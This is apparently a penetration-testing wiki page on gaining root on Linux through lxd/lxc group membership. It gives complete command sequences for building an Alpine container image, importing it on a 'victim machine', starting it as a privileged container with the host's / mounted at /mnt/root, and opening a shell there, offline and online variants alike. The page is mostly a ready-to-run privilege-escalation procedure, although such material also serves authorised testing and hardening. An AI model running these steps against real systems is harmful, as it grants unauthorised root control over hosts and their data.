# lxd/lxc Group - Privilege escalation

If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root

## Exploiting without internet

### Method 1

You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):

```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**

Add the image:

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

Create a container and add root path

```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

{% hint style="danger" %}
If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
Run **`lxc init`** and **repeat **the previous chunk of commands
{% endhint %}

Execute the container:

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

### Method 2

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Alternatively [https://github.com/initstring/lxd_root](https://github.com/initstring/lxd_root)

## With internet

You can follow [these instructions](https://reboare.github.io/lxd/lxd-escape.html).

```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

## Other Refs

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}
